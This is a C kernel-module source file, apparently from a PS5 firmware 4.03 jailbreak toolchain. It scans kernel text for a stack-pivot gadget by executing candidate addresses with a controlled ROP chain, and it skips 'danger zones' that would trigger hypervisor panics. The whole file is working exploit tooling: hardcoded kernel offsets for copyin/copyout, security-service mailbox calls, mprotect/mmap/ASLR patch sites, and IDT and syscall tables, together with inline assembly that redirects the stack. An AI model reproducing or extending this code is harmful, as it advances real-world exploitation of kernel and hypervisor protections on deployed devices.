#include <stdint.h>

/*
 * smart_pivot_scan — Danger-zone-aware ktext pivot gadget scanner
 *
 * Uses the batch_pivot_scan technique (set RAX = pivot chain, ret to
 * candidate address, detect if RSP was redirected) but with SMART
 * exclusion of known dangerous ktext regions that contain privileged
 * instructions (wrmsr, rdmsr, mov crN, mov drN).
 *
 * The PS5 HV causes non-catchable kernel panics on these instructions.
 * By excluding known dangerous zones from the kstuff offset table,
 * the probability of hitting a panic-inducing instruction drops to
 * near zero (the exclusion covers ALL known privileged instruction
 * sites in the FW 4.03 kernel).
 *
 * Uses known kstuff ktext function entry points as starting probes,
 * then probes within function bodies (entry+1, entry+2, ...) where
 * compiler-generated code is safe (no privileged instructions).
 *
 * Configure via -D flags:
 *   SCAN_BATCH:    which batch of the sorted pointer list to scan (0-based)
 *   BATCH_SIZE:    how many functions per batch (default 8)
 *   PROBE_DEPTH:   bytes to probe into each function body (default 128)
 *
 * Output layout (uint64_t indices):
 *   [0]  magic "SPVT" (0x53505654) | status(32)
 *   [1]  kdata_base
 *   [2]  ktext_base
 *   [3]  batch_id | (batch_size << 16) | (probe_depth << 32)
 *   [4]  total_probed
 *   [5]  total_survived
 *   [6]  total_skipped (danger zone hits)
 *   [7]  found_addr (pivot gadget address, or 0)
 *   [8]  found_ktext_offset (ktext-relative, or 0)
 *   [9]  found_pattern_context (8 bytes before pivot via return-value inference)
 *   Per function probed (starting at index 10, 3 uint64_t each):
 *     [10+i*3+0]  function entry address
 *     [10+i*3+1]  probed_count | (survived_count << 16) | (skipped_count << 32)
 *     [10+i*3+2]  last_probed_offset | (status << 32)
 *
 * Max functions: (2304/8 - 10) / 3 = 89
 */

#ifndef SCAN_BATCH
#define SCAN_BATCH     0
#endif
#ifndef BATCH_SIZE
#define BATCH_SIZE     8
#endif
#ifndef PROBE_DEPTH
#define PROBE_DEPTH    128
#endif

#define MAGIC_SPVT     0x53505654  /* "SPVT" */
#define KTEXT_SIZE     0xC00000    /* 12MB */
#define HEADER_SLOTS   10
#define MAX_FUNCS      89
#define ENTRY_STK_SIZE 32

/* ── FW 4.03 known ktext offsets (negative = ktext-relative from kdata) ──
 * Converted to ktext-relative positive offsets:
 *   ktext offset = KDATA_KTEXT_GAP + negative_offset
 * where KDATA_KTEXT_GAP = kdata_base - ktext_base (varies per boot due to KASLR,
 * but the RELATIVE offset between kdata and ktext is constant for a given FW).
 *
 * From kstuff: ktext_base = LSTAR - 0x294218
 * kdata_base - ktext_base depends on the kernel layout.
 * We compute it at runtime.
 */

/* Danger zones: ktext regions containing privileged instructions.
 * These are kdata-relative negative offsets (same as kstuff DEF format).
 * We convert to ktext-relative at runtime.
 *
 * Each entry: { kdata_relative_offset, exclusion_radius }
 */
typedef struct {
    int64_t  kdata_offset;  /* negative = ktext */
    int32_t  radius;        /* bytes to exclude on each side */
} danger_zone_t;

static const danger_zone_t danger_zones[] = {
    /* wrmsr; ret — 0F 30 C3 */
    { -0x9d20cc, 16 },

    /* rdmsr sequence */
    { -0x9d0cfa, 64 },

    /* mov cr3, rax — 0F 22 D8 */
    { -0x396f9e, 16 },

    /* mov rdi, cr3 — reads CR3 */
    { -0x39700e, 16 },

    /* dr2gpr — moves FROM debug registers */
    { -0x9d6d93, 48 },

    /* gpr2dr_1 — moves TO debug registers */
    { -0x9d6c7a, 48 },

    /* gpr2dr_2 — moves TO debug registers */
    { -0x9d6b87, 48 },

    /* cpu_switch — context switch, has privileged ops */
    { -0x9d6f80, 192 },

    /* doreti_iret — iretq (48 CF), dangerous context */
    { -0x9cf84c, 32 },

    /* swapgs region around doreti */
    { -0x9cf84c + 10, 32 },  /* swapgs_add_rsp_iret */

    /* pop_all_iret — pops all regs + iret, dangerous if stack wrong */
    { -0x9cf8ab, 64 },

    /* push_pop_all_iret */
    { -0x96be70, 64 },

    /* kmem_alloc_rwx_fix — inside kmem_alloc, may have privileged ops */
    { -0x70b963, 32 },

    /* Sentinel */
    { 0, 0 }
};

/* Known ktext function entry points from kstuff (safe to call).
 * These are kdata-relative negative offsets.
 * We use these as starting points for probing.
 */
static const int64_t known_ktext_funcs[] = {
    -0x99002a,   /* rep_movsb_pop_rbp_ret */
    -0x9908e0,   /* copyin */
    -0x990990,   /* copyout */
    -0x6824c0,   /* sceSblServiceMailbox */
    -0x8a5c40,   /* sceSblAuthMgrSmIsLoadable2 */
    -0x631ea9,   /* mdbg_call_fix */
    -0x802311,   /* syscall_before */
    -0xa9b00,    /* malloc */
    -0x8a54cd,   /* loadSelfSegment_epilogue */
    -0x8a52c3,   /* decryptSelfBlock_epilogue */
    -0x8a47d2,   /* decryptMultipleSelfBlocks_epilogue */
    -0x8ed940,   /* sceSblServiceCryptAsync */
    -0x479d60,   /* crypt_message_resolve */
    -0x9cf990,   /* justreturn */
    -0xc1ed0,    /* kmem_alloc */
    -0x35ebf0,   /* kproc_create */
    -0x90ac61,   /* mprotect_fix_start */
    -0x2cd31d,   /* mmap_self_fix_1_start */
    -0x1df2ce,   /* mmap_self_fix_2_start */
    -0x85a312,   /* aslr_fix_start */
    -0x6c2989,   /* sigaction_fix_start */
    -0x8a58bc,   /* sceSblServiceMailbox_lr_verifyHeader */
    -0x8a5541,   /* sceSblServiceMailbox_lr_loadSelfSegment */
    -0x8a5014,   /* sceSblServiceMailbox_lr_decryptSelfBlock */
    -0x8a488c,   /* sceSblServiceMailbox_lr_decryptMultipleSelfBlocks */
    -0x8a5cbe,   /* sceSblServiceMailbox_lr_sceSblAuthMgrSmFinalize */
    -0x94a7f0,   /* sceSblServiceMailbox_lr_verifySuperBlock */
    -0x94ada4,   /* sceSblServiceMailbox_lr_sceSblPfsClearKey_1 */
    -0x94ad2e,   /* sceSblServiceMailbox_lr_sceSblPfsClearKey_2 */
    -0x94aaa0,   /* sceSblPfsSetKeys */
    -0x21020,    /* panic (commented in kstuff, but address known) */
    -0x2cc918,   /* loadSelfSegment_watchpoint */
    /* Sentinel */
    0
};

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/* State shared between C and asm */
static volatile uint64_t scan_saved_rsp;
static volatile uint64_t scan_resume_normal;
static volatile uint64_t scan_resume_pivot;
static volatile int scan_got_pivot;

/* Pivot chain: where RSP goes if candidate pivots */
static volatile uint64_t pivot_chain[8];

/* Entry stack: [candidate, resume, resume, resume, ...] */
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];

/* Safe buffer: all registers except RAX/RSP point here before each probe.
 * This prevents page faults from instructions that dereference registers
 * with garbage values. 2KB to handle various [reg + displacement] patterns. */
static volatile uint8_t safe_buf[2048] __attribute__((aligned(64)));

/* Candidate address for the current probe (passed to asm via memory) */
static volatile uint64_t scan_candidate;

__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, scan_got_pivot(%%rip)\n\t"
        "movq scan_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *scan_resume_pivot(%%rip)\n\t"
        ::: "memory"
    );
}

/* Check if an address falls in a danger zone */
static int is_dangerous(uint64_t addr, uint64_t kdata_base)
{
    for (int i = 0; danger_zones[i].radius != 0; i++) {
        uint64_t center = kdata_base + danger_zones[i].kdata_offset;
        int64_t dist = (int64_t)(addr - center);
        if (dist < 0) dist = -dist;
        if (dist < danger_zones[i].radius)
            return 1;
    }
    return 0;
}

/* Simple sort for uint64_t array */
static void sort_u64(uint64_t* arr, int n)
{
    for (int i = 1; i < n; i++) {
        uint64_t key = arr[i];
        int j = i - 1;
        while (j >= 0 && arr[j] > key) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = key;
    }
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t ktext_end = ktext_base + KTEXT_SIZE;

    /* nop_ret = wrmsr_ret + 2 in ktext (just a bare ret instruction) */
    uint64_t nop_ret = kdata_base + (-0x9d20cc) + 2;

    volatile uint64_t* out = (volatile uint64_t*)args;

    /* Clear output buffer */
    for (int i = 0; i < 2304/8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = (uint64_t)SCAN_BATCH | ((uint64_t)BATCH_SIZE << 16) |
             ((uint64_t)PROBE_DEPTH << 32);

    /* Build sorted list of function entry points to probe.
     * Combine known kstuff offsets with IDT entries and sysent entries.
     * MUST be static — kernel threads have no red zone, and large
     * stack arrays risk overflow on the 16KB kernel stack. */
    static uint64_t func_list[512];
    int n_funcs = 0;

    /* Add known kstuff ktext functions */
    for (int i = 0; known_ktext_funcs[i] != 0; i++) {
        uint64_t addr = kdata_base + known_ktext_funcs[i];
        if (addr >= ktext_base && addr < ktext_end && n_funcs < 512)
            func_list[n_funcs++] = addr;
    }

    /* Add IDT handlers */
    volatile uint8_t* idt = (volatile uint8_t*)(kdata_base + 0x64cdc80);
    for (int i = 0; i < 256; i++) {
        uint16_t off_lo  = *(volatile uint16_t*)(idt + i*16 + 0);
        uint16_t off_mid = *(volatile uint16_t*)(idt + i*16 + 6);
        uint32_t off_hi  = *(volatile uint32_t*)(idt + i*16 + 8);
        uint64_t handler = (uint64_t)off_lo | ((uint64_t)off_mid << 16) |
                           ((uint64_t)off_hi << 32);
        if (handler >= ktext_base && handler < ktext_end && n_funcs < 512) {
            /* Dedup */
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == handler) { dup = 1; break; }
            if (!dup)
                func_list[n_funcs++] = handler;
        }
    }

    /* Add sysent sy_call entries (724 entries, stride 0x30, sy_call at +8) */
    volatile uint8_t* sysent = (volatile uint8_t*)(kdata_base + 0x1709c0);
    for (int i = 0; i < 724 && n_funcs < 512; i++) {
        uint64_t sy_call = *(volatile uint64_t*)(sysent + i * 0x30 + 8);
        if (sy_call >= ktext_base && sy_call < ktext_end) {
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == sy_call) { dup = 1; break; }
            if (!dup)
                func_list[n_funcs++] = sy_call;
        }
    }

    /* Add apic_ops entries (28 entries at kdata+0x1656b0) */
    volatile uint64_t* apic_ops = (volatile uint64_t*)(kdata_base + 0x1656b0);
    for (int i = 0; i < 28 && n_funcs < 512; i++) {
        uint64_t fn = apic_ops[i];
        if (fn >= ktext_base && fn < ktext_end) {
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == fn) { dup = 1; break; }
            if (!dup)
                func_list[n_funcs++] = fn;
        }
    }

    /* Sort */
    sort_u64(func_list, n_funcs);

    /* Select batch */
    int batch_start = SCAN_BATCH * BATCH_SIZE;
    int batch_end = batch_start + BATCH_SIZE;
    if (batch_start >= n_funcs) {
        out[0] = ((uint64_t)0xFFFF << 32) | MAGIC_SPVT;  /* past end */
        out[4] = n_funcs;  /* total functions available */
        return 0;
    }
    if (batch_end > n_funcs)
        batch_end = n_funcs;

    /* Set up pivot chain (where RSP goes if pivot works) */
    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    int total_probed = 0;
    int total_survived = 0;
    int total_skipped = 0;

    for (int fi = batch_start; fi < batch_end; fi++) {
        uint64_t func_entry = func_list[fi];
        int func_idx = fi - batch_start;
        int func_probed = 0;
        int func_survived = 0;
        int func_skipped = 0;
        int func_slot = HEADER_SLOTS + func_idx * 3;

        /* Determine safe probe depth: don't go past next function */
        int depth = PROBE_DEPTH;
        if (fi + 1 < n_funcs) {
            int64_t gap = func_list[fi + 1] - func_entry;
            if (gap > 0 && gap < depth)
                depth = (int)gap;
        }

        /* Record function entry */
        if (func_slot + 2 < 2304/8) {
            out[func_slot + 0] = func_entry;
            out[func_slot + 1] = 0;
            out[func_slot + 2] = 0;
        }

        /* Probe each byte offset within this function */
        for (int off = 0; off < depth; off++) {
            uint64_t candidate = func_entry + off;

            /* Check danger zone exclusion */
            if (is_dangerous(candidate, kdata_base)) {
                func_skipped++;
                total_skipped++;
                continue;
            }

            func_probed++;
            total_probed++;

            /* Update progress */
            out[4] = total_probed;
            if (func_slot + 2 < 2304/8) {
                out[func_slot + 2] = (uint64_t)off | ((uint64_t)0xBBBB << 32);
            }

            scan_got_pivot = 0;
            scan_candidate = candidate;

            __asm__ volatile(
                /* Set resume targets */
                "leaq 1f(%%rip), %%rcx\n\t"
                "movq %%rcx, scan_resume_normal(%%rip)\n\t"
                "leaq 2f(%%rip), %%rcx\n\t"
                "movq %%rcx, scan_resume_pivot(%%rip)\n\t"

                /* Fill entry_stk[1..31] with normal resume address */
                "leaq entry_stk(%%rip), %%rdx\n\t"
                "leaq 1f(%%rip), %%rcx\n\t"
                ".set j, 1\n\t"
                ".rept 31\n\t"
                "movq %%rcx, (j*8)(%%rdx)\n\t"
                ".set j, j+1\n\t"
                ".endr\n\t"

                /* Save RSP */
                "movq %%rsp, scan_saved_rsp(%%rip)\n\t"

                /* Load candidate from memory into entry_stk[0] */
                "movq scan_candidate(%%rip), %%rcx\n\t"
                "leaq entry_stk(%%rip), %%rdx\n\t"
                "movq %%rcx, (%%rdx)\n\t"

                /* === REGISTER SAFETY ===
                 * Set ALL registers (except RAX, RSP) to point to safe_buf.
                 * This prevents page faults from instructions that dereference
                 * registers with garbage values. Most compiled code does
                 * [reg + small_offset], so pointing regs to a 2KB buffer
                 * catches the vast majority of memory accesses. */
                "leaq safe_buf(%%rip), %%rdi\n\t"
                "movq %%rdi, %%rsi\n\t"
                "movq %%rdi, %%rdx\n\t"
                "movq %%rdi, %%rcx\n\t"
                "movq %%rdi, %%rbx\n\t"
                "movq %%rdi, %%rbp\n\t"
                "movq %%rdi, %%r8\n\t"
                "movq %%rdi, %%r9\n\t"
                "movq %%rdi, %%r10\n\t"
                "movq %%rdi, %%r11\n\t"
                "movq %%rdi, %%r12\n\t"
                "movq %%rdi, %%r13\n\t"
                "movq %%rdi, %%r14\n\t"
                "movq %%rdi, %%r15\n\t"

                /* Clear direction flag (STD in a candidate would be bad) */
                "cld\n\t"

                /* RAX = pivot_chain (the controlled buffer for RSP pivot) */
                "leaq pivot_chain(%%rip), %%rax\n\t"

                /* Switch RSP to entry stack and go */
                "leaq entry_stk(%%rip), %%rsp\n\t"
                "retq\n\t"

                /* Normal resume: candidate returned without pivoting */
                "1:\n\t"
                "movq scan_saved_rsp(%%rip), %%rsp\n\t"
                "jmp 3f\n\t"

                /* Pivot resume: candidate DID pivot RSP to our buffer! */
                "2:\n\t"
                "movq scan_saved_rsp(%%rip), %%rsp\n\t"

                "3:\n\t"
                ::: "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
                    "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
                    "rbp", "memory", "cc"
            );

            if (scan_got_pivot) {
                /* FOUND A PIVOT GADGET! */
                out[7] = candidate;
                out[8] = candidate - ktext_base;
                out[0] = ((uint64_t)0x0002 << 32) | MAGIC_SPVT;
                out[5] = total_survived;
                out[6] = total_skipped;
                if (func_slot + 2 < 2304/8) {
                    out[func_slot + 1] = (uint64_t)func_probed |
                                         ((uint64_t)func_survived << 16) |
                                         ((uint64_t)func_skipped << 32);
                    out[func_slot + 2] = (uint64_t)off | ((uint64_t)0x4849 << 32);
                }
                return 0;
            }

            func_survived++;
            total_survived++;
        }

        /* Record per-function stats */
        if (func_slot + 2 < 2304/8) {
            out[func_slot + 1] = (uint64_t)func_probed |
                                 ((uint64_t)func_survived << 16) |
                                 ((uint64_t)func_skipped << 32);
            out[func_slot + 2] = (uint64_t)(depth - 1) |
                                 ((uint64_t)0x0001 << 32);
        }
    }

    /* Completed batch, no pivot found */
    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    out[4] = total_probed;
    out[5] = total_survived;
    out[6] = total_skipped;

    return 0;
}
